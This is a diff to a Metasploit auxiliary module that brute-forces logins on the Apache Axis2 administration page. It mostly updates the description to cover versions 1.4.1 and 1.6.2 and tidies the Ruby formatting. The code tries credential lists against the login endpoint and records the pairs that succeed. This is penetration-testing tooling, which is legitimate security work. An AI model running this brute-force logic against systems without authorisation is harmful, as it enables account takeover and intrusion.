@@ -17,10 +17,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Apache Axis2 v1.4.1 Brute Force Utility',
-      'Description'    => %q{This module attempts to login to an Apache Axis2 v1.4.1
-        instance using username and password combindations indicated by the USER_FILE,
-        PASS_FILE, and USERPASS_FILE options.
+      'Name'           => 'Apache Axis2 Brute Force Utility',
+      'Description'    => %q{
+        This module attempts to login to an Apache Axis2 instance using
+        username and password combindations indicated by the USER_FILE,
+        PASS_FILE, and USERPASS_FILE options. It has been verified to
+        work on at least versions 1.4.1 and 1.6.2.
       },
       'Author'         =>
         [
@@ -35,9 +37,9 @@ class Metasploit3 < Msf::Auxiliary
       'License'        => MSF_LICENSE
     )
 
-    register_options(
-      [ Opt::RPORT(8080),
-        OptString.new('URI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
+    register_options( [
+      Opt::RPORT(8080),
+      OptString.new('URI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
     ], self.class)
   end
 
@@ -49,10 +51,10 @@ class Metasploit3 < Msf::Auxiliary
 
     print_status("Verifying login exists at #{target_url}")
     begin
-      res = send_request_cgi({
-          'method'  => 'GET',
-          'uri'     => datastore['URI']
-        }, 20)
+      send_request_cgi({
+        'method'  => 'GET',
+        'uri'     => datastore['URI']
+      }, 20)
     rescue
       print_error("The Axis2 login page does not exist at #{target_url}")
       return
@@ -77,12 +79,12 @@ class Metasploit3 < Msf::Auxiliary
         'data'    => post_data,
       }, 20)
 
-      if (res and res.code == 200 and res.body.to_s.match(/upload/) != nil)
+      if res && res.code == 200 && res.body.to_s.match(/upload/) != nil
         print_good("#{target_url} - Apache Axis - SUCCESSFUL login for '#{user}' : '#{pass}'")
         report_auth_info(
           :host   => rhost,
           :port   => rport,
-          :sname => (ssl ? 'https' : 'http'),
+          :sname  => (ssl ? 'https' : 'http'),
           :user   => user,
           :pass   => pass,
           :proof  => "WEBAPP=\"Apache Axis\", VHOST=#{vhost}",
@@ -91,7 +93,7 @@ class Metasploit3 < Msf::Auxiliary
           :active => true
         )
 
-      elsif(res and res.code == 200)
+      elsif res && res.code == 200
         vprint_error("#{target_url} - Apache Axis - Failed to login as '#{user}'")
       else
         vprint_error("#{target_url} - Apache Axis - Unable to authenticate.")
